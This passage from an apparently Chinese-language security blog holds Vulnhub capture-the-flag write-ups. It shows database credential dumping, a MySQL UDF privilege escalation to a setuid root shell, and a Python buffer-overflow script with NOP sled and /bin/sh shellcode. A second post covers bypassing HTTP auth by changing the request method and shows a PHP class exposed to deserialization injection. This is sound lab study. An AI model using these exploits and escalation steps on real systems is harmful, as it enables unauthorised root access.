<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> smeagol  <span class="p">|</span> MyPreciousR00t   <span class="p">|</span>
<span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> aragorn  <span class="p">|</span> AndMySword       <span class="p">|</span>
<span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> legolas  <span class="p">|</span> AndMyBow         <span class="p">|</span>
<span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> gimli    <span class="p">|</span> AndMyAxe         <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+</code></pre></div></p>

<p>成功把資料庫dump出來</p>

<p>裡面有一張表看起來有點用處的帳號+密碼組合</p>

<p>還得到了mysql內root的密碼為darkshadow</p>

<p>拿這些帳號密碼去嘗試登入ssh，最後成功使用smeagol登入</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Documentation:  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://help.ubuntu.com/&quot;</span>&gt;https://help.ubuntu.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;261 packages can be updated.
<span class="m">128</span> updates are security updates.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;                        .____    _____________________________
                        <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
                        <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
                        <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
                        <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
                                <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt; &lt;strong&gt;      &lt;/strong&gt;       .&lt;strong&gt;                                &lt;/strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt;&lt;strong&gt;&lt;strong&gt;      .&lt;/strong&gt;                   .&lt;/strong&gt;&lt;/em&gt;
/  <span class="se">\ </span>   /  <span class="se">\ </span>&lt;/strong&gt;&lt;/strong&gt; <span class="p">|</span>  <span class="p">|</span>   &lt;strong&gt;&lt;strong&gt;  &lt;/strong&gt;&lt;/strong&gt;   &lt;em&gt;&lt;strong&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;/strong&gt;   _   &lt;/em&gt;&lt;strong&gt;&lt;strong&gt;/&lt;/strong&gt;&lt;/strong&gt;&lt;strong&gt;<span class="p">|</span>&lt;/strong&gt;<span class="p">|</span> &lt;strong&gt;&lt;strong&gt;   &lt;/strong&gt;&lt;/strong&gt;    &lt;strong&gt;<span class="p">|</span> _/
<span class="se">\ </span>  <span class="se">\/\/</span>   // &lt;/strong&gt; <span class="p">|</span>  <span class="p">|</span> &lt;em&gt;/ &lt;/em&gt;&lt;strong&gt;<span class="se">\/</span>  _ <span class="se">\ </span>/     _/ &lt;/strong&gt; <span class="se">\ </span>  <span class="p">|</span>    &lt;strong&gt;<span class="o">)</span> _  &lt;/strong&gt; <span class="se">\ </span> <span class="p">|</span>/ &lt;strong&gt; <span class="se">\ </span>/    <span class="se">\ </span> / &lt;/strong&gt; <span class="p">|</span>
 <span class="se">\ </span>       /<span class="se">\ </span> &lt;strong&gt;&lt;em&gt;/<span class="p">|</span>  <span class="p">|</span>&lt;/em&gt;<span class="se">\ </span> _&lt;em&gt;<span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  Y Y  <span class="se">\ </span> &lt;/em&gt;&lt;/strong&gt;/   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> &lt;strong&gt;&lt;em&gt;/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /&lt;/em&gt;/ <span class="p">|</span>
  __/<span class="se">\ </span> /  _&lt;/strong&gt;  &gt;&lt;em&gt;&lt;em&gt;&lt;strong&gt;/_&lt;/strong&gt;  &gt;&lt;/em&gt;&lt;/em&gt;&lt;strong&gt;/<span class="p">|</span>&lt;/strong&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>  /_&lt;strong&gt;  &gt;  _&lt;/strong&gt;  /   <span class="p">|</span>&lt;strong&gt;<span class="p">|</span>  <span class="p">|</span>&lt;/strong&gt;<span class="p">|</span>_&lt;strong&gt;  &gt;&lt;/strong&gt;&lt;/em&gt;<span class="p">|</span>  /____ <span class="p">|</span>
       <span class="se">\/</span>       <span class="se">\/</span>          <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>       <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>
Last login: Tue Sep <span class="m">22</span> 12:59:38 <span class="m">2015</span> from 192.168.55.135
smeagol@LordOfTheRoot:~<span class="err">$</span></code></pre></div></p>

<p>再來登入mysql，試試看之前看過的<a href="http://www.0xdeadbeef.info/exploits/raptor_udf2.c">MySQL UDF Exploit</a>有沒有效果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>cp /bin/sh /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>cp /bin/sh /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>&lt;/p&gt;

&lt;p&gt;mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>chmod <span class="m">4777</span> /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span> do_system<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>chmod <span class="m">4777</span> /home/smeagol/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+
<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
+<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>+</code></pre></div></p>

<p>接著來看看成果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span>ls -al
<span class="p">&amp;</span>hellip<span class="p">;</span>
-rwsrwxrwx  <span class="m">1</span> root    root    <span class="m">112204</span> Dec <span class="m">26</span> 16:43 bash
<span class="p">&amp;</span>hellip<span class="p">;</span>
smeagol@LordOfTheRoot:~<span class="nv">$ </span>./sh
bash-4.3<span class="nv">$ </span>id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
bash-4.3<span class="nv">$ </span>cat /root/Flag.txt
“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
– Gandalf</code></pre></div></p>

<p>成功拿下魔戒的root！不過總覺得用這個方法拿到root有點太過輕鬆</p>

<p>於是簡單地檢查了一下，最後找到了三支奇怪的程式</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
-rwsr-xr-x <span class="m">1</span> root root <span class="m">5150</span> Sep <span class="m">22</span> 13:01 /SECRET/door2/file
-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door1/file
-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door3/file</code></pre></div></p>

<p>而且這命名看起來才飽含了作者對魔戒的愛，從這邊拿下root應該才是作者所希望的解法。</p>

<p>這三個file檔分別放在door1, door2, door3三個目錄下</p>

<p>其中兩支看起來似乎是同一支程式，而且執行之後沒做甚麼事情就結束了</p>

<p>剩下的一支可以傳入參數達到Buffer Overflow的效果</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# objdump -D file <span class="p">|</span> grep -A30 main.:
0804845d &lt;main&gt;:
 804845d:       <span class="m">55</span>                      push   %ebp
 804845e:       <span class="m">89</span> e5                   mov    %esp,%ebp
 8048460:       <span class="m">83</span> e4 f0                and    <span class="nv">$0xfffffff0</span>,%esp
 8048463:       <span class="m">81</span> ec b0 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       sub    <span class="nv">$0xb0</span>,%esp
 8048469:       <span class="m">83</span> 7d <span class="m">08</span> <span class="m">01</span>             cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
 804846d:       7f <span class="m">21</span>                   jg     <span class="m">8048490</span> <span class="p">&amp;</span>lt<span class="p">;</span>main+0x33&gt;
 804846f:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
 8048472:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
 8048474:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
 8048478:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">40</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>    movl   <span class="nv">$0x8048540</span>,<span class="o">(</span>%esp<span class="o">)</span>
 804847f:       e8 8c fe ff ff          call   <span class="m">8048310</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">printf</span>@plt&gt;
 8048484:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    movl   <span class="nv">$0x0</span>,<span class="o">(</span>%esp<span class="o">)</span>
 804848b:       e8 b0 fe ff ff          call   <span class="m">8048340</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="nb">exit</span>@plt&gt;
 8048490:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
 8048493:       <span class="m">83</span> c0 <span class="m">04</span>                add    <span class="nv">$0x4</span>,%eax
 8048496:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
 8048498:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
 804849c:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">11</span>             lea    0x11<span class="o">(</span>%esp<span class="o">)</span>,%eax
 80484a0:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
 80484a3:       e8 <span class="m">78</span> fe ff ff          call   <span class="m">8048320</span> <span class="p">&amp;</span>lt<span class="p">;</span>strcpy@plt&gt;
 80484a8:       b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
 80484ad:       c9                      leave
 80484ae:       c3                      ret</code></pre></div></p>

<p>接著用pattern_create.rb和pattern_offset.rb找出EIP的注入點</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41376641
<span class="o">[</span>*<span class="o">]</span> Exact match at offset 171</code></pre></div></p>

<p>再來先檢查目標端的ASLR有沒有開啟</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:/SECRET/door3<span class="nv">$ </span>cat /proc/sys/kernel/randomize_va_space
2</code></pre></div></p>

<p>ASLR是開著的，看來要靠nop-sled拼人品了</p>

<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">struct</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">nopsled</span> <span class="o">=</span> <span class="mi">20000</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">payload</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="mi">171</span>               <span class="c"># trash</span>
<span class="n">payload</span><span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x50</span>\<span class="n">x2e</span>\<span class="n">xb0</span>\<span class="n">xbf</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c"># EIP</span>
<span class="n">payload</span><span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x90</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">nopsled</span>        <span class="c"># nop sled</span>
<span class="n">payload</span><span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x50</span>\<span class="n">x68</span>\<span class="n">x2f</span>\<span class="n">x2f</span>\<span class="n">x73</span>\<span class="n">x68</span>\<span class="n">x68</span>\<span class="n">x2f</span>\<span class="n">x62</span>\<span class="n">x69</span>\<span class="n">x6e</span>\<span class="n">x89</span>\<span class="n">xe3</span>\<span class="n">x89</span>\<span class="n">xc1</span>\<span class="n">x89</span>\<span class="n">xc2</span>\<span class="n">xb0</span>\<span class="n">x0b</span>\<span class="n">xcd</span>\<span class="n">x80</span>\<span class="n">x31</span>\<span class="n">xc0</span>\<span class="n">x40</span>\<span class="n">xcd</span>\<span class="n">x80</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>        <span class="c">#shellcode&lt;/p&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
                <span class="n">cmd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">SECRET</span><span class="o">/</span><span class="n">door</span><span class="o">%</span><span class="n">d</span><span class="o">/</span><span class="nb">file</span> <span class="o">%</span><span class="n">s</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
                <span class="n">os</span><span class="o">.</span><span class="n">system</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span></code></pre></div></p>

<p>拿了一份會執行/bin/sh的
<a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shellcode</a>，把payload拼完之後就是賭人品的時刻了</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>&lt;/p&gt;

&lt;h1&gt;id&lt;/h1&gt;

&lt;p&gt;uid<span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span></code></pre></div></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[/dev/random: Pipe]]></title>
    <link href="http://newdominic.github.io/blog/2015/12/23/pipe/"/>
    <updated>2015-12-23T00:38:42+08:00</updated>
    <id>http://newdominic.github.io/blog/2015/12/23/pipe</id>
    <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/devrandom-pipe,124/">/dev/random: Pipe</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>

<!--more-->


<hr />

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p- -T5 -n&lt;/p&gt;

&lt;p&gt;Starting Nmap 6.49BETA4 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2015-12-21 04:55 CST
Warning: 192.168.0.118 giving up on port because retransmission cap hit <span class="o">(</span>2<span class="o">)</span>.
Nmap scan report <span class="k">for</span> 192.168.0.118
Host is up <span class="o">(</span>0.00019s latency<span class="o">)</span>.
Not shown: <span class="m">65531</span> closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
35856/tcp open  unknown
MAC Address: 08:00:27:D7:0B:8C <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>&lt;/p&gt;

&lt;p&gt;Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 513.72 seconds</code></pre></div></p>

<p>nmap掃出了四個開啟的port，先來看一下port 80</p>

<p><img class="center" src="/images/2015-12-23-pipe/web.png"></p>

<p>&hellip;&hellip;第一次遇到首頁就要輸入帳號密碼的</p>

<p>35856不知道做甚麼用的，再深入掃瞄試試</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/Security/pipe# nmap 192.168.0.118 -p 22,80,111,35856 -A -O
<span class="p">&amp;</span>hellip<span class="p">;</span>
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian <span class="m">5</span> <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey:
<span class="p">|</span>   <span class="m">1024</span> 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f <span class="o">(</span>DSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">2048</span> ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>&lt;em&gt;  <span class="m">256</span> d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp    open  http    Apache httpd
<span class="p">|</span> http-auth:
<span class="p">|</span> HTTP/1.1 <span class="m">401</span> Unauthorized
<span class="p">|</span>&lt;/em&gt;  Basic <span class="nv">realm</span><span class="o">=</span>index.php
<span class="p">|</span>&lt;em&gt;http-methods: No Allow or Public header in OPTIONS response <span class="o">(</span>status code 401<span class="o">)</span>
<span class="p">|</span>&lt;/em&gt;http-server-header: Apache
<span class="p">|</span>&lt;em&gt;http-title: <span class="m">401</span> Unauthorized
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
<span class="p">|</span> rpcinfo:
<span class="p">|</span>   program version   port/proto  service
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
<span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35856/tcp  status
<span class="p">|</span>&lt;/em&gt;  <span class="m">100024</span>  <span class="m">1</span>          44438/udp  status
35856/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span></code></pre></div></p>

<p>結果是rpc對應的port。</p>

<p>在不知道能做甚麼的情況下，只好回到網頁的部分亂試一通</p>

<p>最後試到只要在request method的部分不要用GET就能繞過認證了</p>

<p><img class="center" src="/images/2015-12-23-pipe/index.png"></p>

<p>接著檢視一下程式碼</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;/p&gt;

&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;scriptz/php.js&quot;</span>&gt;&lt;/script&gt;


&lt;p&gt;&lt;script&gt;
<span class="k">function</span> submit_form<span class="o">()</span> <span class="o">{</span>
var <span class="nv">object</span> <span class="o">=</span> serialize<span class="o">({</span>id: 1, firstname: <span class="p">&amp;</span>lsquo<span class="p">;</span>Rene<span class="p">&amp;</span>rsquo<span class="p">;</span>, surname: <span class="p">&amp;</span>lsquo<span class="p">;</span>Margitte<span class="p">&amp;</span>rsquo<span class="p">;</span>, artwork: <span class="p">&amp;</span>lsquo<span class="p">;</span>The Treachery of Images<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">})</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> object.substr<span class="o">(</span>object.indexOf<span class="o">(</span><span class="p">&amp;</span>ldquo<span class="p">;</span><span class="o">{</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>,object.length<span class="o">)</span><span class="p">;</span>
<span class="nv">object</span> <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>O:4:<span class="se">\&quot;</span>Info<span class="se">\&amp;</span>rdquo<span class="p">;</span>:4:<span class="p">&amp;</span>ldquo<span class="p">;</span> + object<span class="p">;</span>
document.forms<span class="o">[</span>0<span class="o">]</span>.param.value <span class="o">=</span> object<span class="p">;</span>
document.getElementById<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>info_form<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>.submit<span class="o">()</span><span class="p">;</span>
<span class="o">}</span>
<span class="p">&amp;</span>hellip<span class="p">;</span>
&lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span> <span class="nv">id</span><span class="o">=</span><span class="s2">&quot;info_form&quot;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span>&gt;
   &lt;input <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&quot;param&quot;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> /&gt;
   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nv">onclick</span><span class="o">=</span><span class="s2">&quot;submit_form(); return false;&quot;</span>&gt;Show Artist Info.&lt;/a&gt;
&lt;/form&gt;&lt;/center&gt;&lt;/html&gt;</code></pre></div></p>

<p>scriptz目錄是開放的，從裡面獲得另一個檔案&#8221;log.php.BAK&#8221;</p>

<p>這個class會在destruct的時候將data的內容寫入filename</p>

<p><div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="p">&amp;</span>lt<span class="p">;</span>?php
class Log
<span class="o">{</span>
    public <span class="nv">$filename</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;;</span>
    public <span class="nv">$data</span> <span class="o">=</span> <span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;;</span>&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public <span class="k">function</span> __construct<span class="o">()</span>
<span class="o">{</span>
    <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span><span class="nv">filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span><span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="o">}</span>

public <span class="k">function</span> PrintLog<span class="o">()</span>
<span class="o">{</span>
    <span class="nv">$pre</span> <span class="o">=</span> <span class="s2">&quot;[LOG]&quot;</span><span class="p">;</span>
    <span class="nv">$now</span> <span class="o">=</span> date<span class="o">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="o">)</span><span class="p">;</span>

    <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;$pre - $now - $this-&amp;gt;data&#39;</span><span class="p">;</span>
    <span class="nb">eval</span><span class="o">(</span><span class="s2">&quot;\$str = \&quot;$str\&quot;;&quot;</span><span class="o">)</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="nv">$str</span><span class="p">;</span>
<span class="o">}</span>

public <span class="k">function</span> __destruct<span class="o">()</span>
<span class="o">{</span>
    file_put_contents<span class="o">(</span><span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span>filename, <span class="nv">$this</span>-<span class="p">&amp;</span>gt<span class="p">;</span>data, FILE_APPEND<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;<span class="o">}</span>
?&gt;</code></pre></div></p>

